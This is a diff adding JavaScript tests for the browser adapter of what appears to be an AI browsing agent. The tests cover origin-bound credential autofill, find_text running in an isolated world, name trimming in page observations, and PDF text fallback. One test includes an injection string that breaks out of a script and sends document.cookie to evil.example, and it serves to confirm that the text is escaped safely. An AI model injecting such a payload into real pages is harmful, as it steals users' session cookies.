@@ -82,6 +82,31 @@ test("credential autofill is origin-bound, fills only a unique login pair, and n
   assert.deepEqual(await browser.fillCredential({ username: "a", password: "p", origin: "http://accounts.example" }), { status: "failed", errorCode: "credential_origin_mismatch" });
 });
 
+test("credential autofill checks the origin again inside the page, so a page that replaced the login page gets nothing", async () => {
+  const filled = [];
+  class HTMLInputElement {}
+  Object.defineProperty(HTMLInputElement.prototype, "value", { get() { return ""; }, set(value) { filled.push(value); } });
+  const field = (type, name) => Object.assign(Object.create(HTMLInputElement.prototype), {
+    type, name, id: name, autocomplete: "", disabled: false, getBoundingClientRect: () => ({ width: 120, height: 24 }), dispatchEvent: () => true,
+  });
+  const inputs = [field("email", "email"), field("password", "password")];
+  let documentOrigin = "https://evil.example";
+  const browser = new BrowserAdapter({ view: makeFakeView({
+    // The host still reports the login page: the navigation commits between that check and the fill.
+    getURL: () => "https://accounts.example/login",
+    executeJavaScript: async (script) => vm.runInContext(script, vm.createContext({
+      location: { origin: documentOrigin }, HTMLInputElement, document: { querySelectorAll: () => inputs },
+      getComputedStyle: () => ({ display: "block", visibility: "visible" }), Event: class { constructor(type) { this.type = type; } },
+    })),
+  }) });
+  const fill = async () => ({ ...(await browser.fillCredential({ username: "alice@example.com", password: "supersecret", origin: "https://accounts.example" })) });
+  assert.deepEqual(await fill(), { status: "failed", errorCode: "credential_origin_mismatch" });
+  assert.deepEqual(filled, [], "(the bug) the secret went into the page that replaced the login page");
+  documentOrigin = "https://accounts.example";
+  assert.deepEqual(await fill(), { status: "ok", usernameFilled: true, passwordFilled: true });
+  assert.deepEqual(filled, ["alice@example.com", "supersecret"]);
+});
+
 test("BrowserAdapter repeats the current permission boundary for direct execute calls", async () => {
   let navigations = 0;
   const browser = new BrowserAdapter({ view: makeFakeView({ loadURL: async () => { navigations += 1; } }) });
@@ -451,6 +476,168 @@ test("execute(scroll) proceeds when documentEpoch matches the current document",
 
   assert.equal(result.status, "ok");
   assert.equal(scrolled, true);
+});
+
+// --- token cost: a container's name repeats its children's names, so only what the children do not already say is kept ---
+
+test("observe() keeps a container's own words but drops the child names it merely repeats", async () => {
+  const raw = {
+    url: "https://shop.example/", title: "Shop", text: "",
+    elements: [
+      { index: 0, role: "list", name: "Phone case $12.99 Add to cart Charger $20.00 Add to cart", parentIndex: null },
+      { index: 1, role: "listitem", name: "Phone case $12.99 Add to cart", parentIndex: 0 },
+      { index: 2, role: "link", name: "Phone case", parentIndex: 1, href: "https://shop.example/case" },
+      { index: 3, role: "button", name: "Add to cart", parentIndex: 1 },
+      { index: 4, role: "listitem", name: "Charger $20.00 Add to cart", parentIndex: 0 },
+      { index: 5, role: "link", name: "Charger", parentIndex: 4, href: "https://shop.example/charger" },
+      { index: 6, role: "button", name: "Add to cart", parentIndex: 4 },
+      { index: 7, role: "navigation", name: "Main menu", parentIndex: null },
+      { index: 8, role: "link", name: "Home", parentIndex: 7, href: "https://shop.example/" },
+    ],
+  };
+  const adapter = new BrowserAdapter({ view: makeFakeView({ executeJavaScript: async () => raw }) });
+  const { elements } = await adapter.observe();
+  const byId = Object.fromEntries(elements.map((e) => [e.elementId, e]));
+  assert.equal(byId["1"].name, "$12.99", "the price only the item says stays, on the item");
+  assert.equal(byId["4"].name, "$20.00");
+  assert.equal(byId["0"].name, "", "a list whose items already say everything keeps no name of its own");
+  assert.equal(byId["7"].name, "Main menu", "words no child repeats are kept");
+  for (const id of ["2", "3", "5", "6", "8"]) assert.ok(byId[id].name.length > 0, "interactive elements keep their names");
+  assert.equal(byId["3"].parentElementId, "1", "the structure that ties a button to its item is unchanged");
+  assert.equal(elements.length, 9, "no element is removed");
+});
+
+test("observe() never trims a label a person wrote (forms, landmarks), so a checkout form named by its own heading keeps its name", async () => {
+  const raw = {
+    url: "https://shop.example/", title: "Shop", text: "",
+    elements: [
+      { index: 0, role: "form", name: "Place order", parentIndex: null, formAction: "https://shop.example/order", formMethod: "post" },
+      { index: 1, role: "heading", name: "Place order", parentIndex: 0, level: 2 },
+      { index: 2, role: "button", name: "Place order", parentIndex: 0, formAction: "https://shop.example/order", formMethod: "post" },
+      { index: 3, role: "navigation", name: "Account", parentIndex: null },
+      { index: 4, role: "link", name: "Account", parentIndex: 3, href: "https://shop.example/account" },
+    ],
+  };
+  const adapter = new BrowserAdapter({ view: makeFakeView({ executeJavaScript: async () => raw }) });
+  const { elements } = await adapter.observe();
+  assert.equal(elements[0].name, "Place order", "the payment check reads this name");
+  assert.equal(elements[3].name, "Account");
+});
+
+test("observe() removes a repeated child name only as whole words, never from inside another word", async () => {
+  const raw = {
+    url: "https://shop.example/", title: "Shop", text: "",
+    elements: [
+      { index: 0, role: "listitem", name: "Visit the Cartier boutique Cart", parentIndex: null },
+      { index: 1, role: "button", name: "Cart", parentIndex: 0 },
+      { index: 2, role: "listitem", name: "Carton of milk $3.20 Add", parentIndex: null },
+      { index: 3, role: "link", name: "Carton of milk", parentIndex: 2, href: "https://shop.example/milk" },
+      { index: 4, role: "button", name: "Add", parentIndex: 2 },
+    ],
+  };
+  const adapter = new BrowserAdapter({ view: makeFakeView({ executeJavaScript: async () => raw }) });
+  const { elements } = await adapter.observe();
+  assert.equal(elements[0].name, "Visit the Cartier boutique", "Cartier stays whole; the trailing Cart is the button's");
+  assert.equal(elements[2].name, "$3.20");
+});
+
+test("observe() never shortens the name of an interactive element or a heading, even when it has children", async () => {
+  const raw = {
+    url: "https://shop.example/", title: "Shop", text: "",
+    elements: [
+      { index: 0, role: "link", name: "Buy now Phone case", parentIndex: null, href: "https://shop.example/case" },
+      { index: 1, role: "heading", name: "Phone case sale", parentIndex: null, level: 2 },
+      { index: 2, role: "button", name: "Phone case", parentIndex: 0 },
+    ],
+  };
+  const adapter = new BrowserAdapter({ view: makeFakeView({ executeJavaScript: async () => raw }) });
+  const { elements } = await adapter.observe();
+  assert.equal(elements[0].name, "Buy now Phone case");
+  assert.equal(elements[1].name, "Phone case sale");
+});
+
+// --- find_text: the planner names text, the host finds it on the page and scrolls it into view ---
+
+// find_text runs in the host's isolated world: a page script can neither read the words nor fake the result.
+function isolatedFindView({ executeJavaScript }) {
+  const mainWorld = [];
+  return {
+    mainWorld,
+    webContents: {
+      loadURL: async () => {},
+      stop: () => {},
+      executeJavaScript: async (script) => { mainWorld.push(script); return executeJavaScript(script); },
+      executeJavaScriptInIsolatedWorld: async (_worldId, scripts) => executeJavaScript(scripts[0].code),
+    },
+  };
+}
+
+test("execute(find_text) never runs in the page's own world, where page scripts could read the words", async () => {
+  const view = isolatedFindView({ executeJavaScript: async (script) => (script.includes("__haloFindText") ? { found: true, count: 1 } : { url: "https://example.com/", title: "", text: "", elements: [] }) });
+  const adapter = new BrowserAdapter({ view });
+  assert.equal((await adapter.execute({ type: "find_text", text: "Order 4417-2209" })).status, "ok");
+  assert.equal(view.mainWorld.some((script) => script.includes("__haloFindText")), false);
+});
+
+test("execute(find_text) finds nothing rather than fall back to the page's world when there is no isolated world", async () => {
+  const seen = [];
+  const view = makeFakeView({ executeJavaScript: async (script) => { seen.push(script); return { url: "https://example.com/", title: "", text: "", elements: [] }; } });
+  const adapter = new BrowserAdapter({ view });
+  assert.deepEqual(await adapter.execute({ type: "find_text", text: "x" }), { status: "failed", errorCode: "find_text_failed" });
+  assert.equal(seen.some((script) => script.includes("__haloFindText")), false);
+});
+
+
+test("execute(find_text) scrolls the first match into view and reports how many matched", async () => {
+  const scripts = [];
+  const view = isolatedFindView({
+    executeJavaScript: async (script) => {
+      scripts.push(script);
+      if (script.includes("__haloFindText")) return { found: true, count: 3 };
+      return { url: "https://example.com/", title: "", text: "", elements: [] };
+    },
+  });
+  const adapter = new BrowserAdapter({ view });
+  const result = await adapter.execute({ type: "find_text", text: "Add to cart" });
+  assert.equal(result.status, "ok");
+  assert.equal(result.matchCount, 3);
+  assert.ok(scripts.some((script) => script.includes("__haloFindText") && script.includes('"Add to cart"')));
+});
+
+test("execute(find_text) fails with text_not_found when the page has no match", async () => {
+  const view = isolatedFindView({ executeJavaScript: async (script) => script.includes("__haloFindText") ? { found: false, count: 0 } : { url: "https://example.com/", title: "", text: "", elements: [] } });
+  const adapter = new BrowserAdapter({ view });
+  assert.deepEqual(await adapter.execute({ type: "find_text", text: "nothing here" }), { status: "failed", errorCode: "text_not_found" });
+});
+
+test("execute(find_text) rejects empty, non-string and oversized text without running a script", async () => {
+  let ran = false;
+  const view = isolatedFindView({ executeJavaScript: async (script) => { if (script.includes("__haloFindText")) ran = true; return { url: "https://example.com/", title: "", text: "", elements: [] }; } });
+  const adapter = new BrowserAdapter({ view });
+  for (const text of ["", "   ", 7, null, undefined, "x".repeat(201)]) {
+    assert.deepEqual(await adapter.execute({ type: "find_text", text }), { status: "failed", errorCode: "invalid_find_text" }, JSON.stringify(text));
+  }
+  assert.equal(ran, false);
+});
+
+test("execute(find_text) puts the text in the script as one JSON string, so quotes and tags cannot end it", async () => {
+  const scripts = [];
+  const view = isolatedFindView({ executeJavaScript: async (script) => { scripts.push(script); return script.includes("__haloFindText") ? { found: true, count: 1 } : { url: "https://example.com/", title: "", text: "", elements: [] }; } });
+  const adapter = new BrowserAdapter({ view });
+  const hostile = '"); fetch("https://evil.example/?"+document.cookie); ("</script>`${1}';
+  await adapter.execute({ type: "find_text", text: hostile });
+  const script = scripts.find((value) => value.includes("__haloFindText"));
+  assert.ok(script.includes(JSON.stringify(hostile)), "the text appears only as a JSON string literal");
+  assert.equal(script.split(hostile).length, 1, "so the raw text, with its unescaped quote, never appears");
+});
+
+test("execute(find_text) rejects a stale documentEpoch without searching", async () => {
+  let ran = false;
+  const view = isolatedFindView({ executeJavaScript: async (script) => { if (script.includes("__haloFindText")) ran = true; return { url: "https://example.com/", title: "", text: "", elements: [] }; } });
+  const adapter = new BrowserAdapter({ view });
+  const result = await adapter.execute({ type: "find_text", text: "x" }, { documentEpoch: 99 });
+  assert.equal(result.errorCode, "stale_document");
+  assert.equal(ran, false);
 });
 
 // --- follow_link: host-owned elementId only, real href re-resolved at
@@ -1010,4 +1197,30 @@ test("execute(scroll) that never returns fails as scroll_failed instead of hangi
   const adapter = new BrowserAdapter({ view, scrollTimeoutMs: 30 });
   const result = await adapter.execute({ type: "scroll", direction: "down" });
   assert.deepEqual([result.status, result.errorCode], ["failed", "scroll_failed"]);
+});
+
+test("an empty page that is really a PDF gets its text from the file", async () => {
+  const pdf = Buffer.from("%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>\nendobj\n4 0 obj\n<< /Length 41 >>\nstream\nBT /F1 12 Tf 20 100 Td (card text) Tj ET\nendstream\nendobj\n5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\ntrailer\n<< /Size 6 /Root 1 0 R >>\n%%EOF\n", "latin1");
+  const requested = [];
+  const view = makeFakeView({ getURL: () => "https://example.com/card", executeJavaScript: async () => ({ url: "https://example.com/card", title: "", text: "", elements: [] }) });
+  view.webContents.session = { fetch: async (url) => { requested.push(url); return new Response(pdf, { headers: { "content-type": "application/pdf" } }); } };
+  const adapter = new BrowserAdapter({ view });
+  const observation = await adapter.observe();
+  assert.deepEqual(requested, ["https://example.com/card"]);
+  assert.match(observation.text, /card text/);
+});
+
+test("a page with its own text never triggers the PDF fetch", async () => {
+  const view = makeFakeView({ getURL: () => "https://example.com/", executeJavaScript: async () => ({ url: "https://example.com/", title: "T", text: "hello", elements: [] }) });
+  view.webContents.session = { fetch: async () => { throw new Error("must not fetch"); } };
+  const observation = await new BrowserAdapter({ view }).observe();
+  assert.equal(observation.text, "hello");
+});
+
+test("section headings stay in the observation after the element cap is full of earlier links", () => {
+  const links = Array.from({ length: 5 }, (_, i) => new FakeElement("a", { text: `link ${i}`, attrs: { href: `/l${i}` } }));
+  const heading = new FakeElement("h4", { text: "3.1.2. GPT-6 Sol" });
+  const observation = runObserveScriptAgainst(new FakeElement("body", { children: [...links, heading] }), { maxElements: 3 });
+  assert.equal(observation.elements.filter((entry) => entry.role === "link").length, 3);
+  assert.ok(observation.elements.some((entry) => entry.role === "heading" && entry.name === "3.1.2. GPT-6 Sol"));
 });
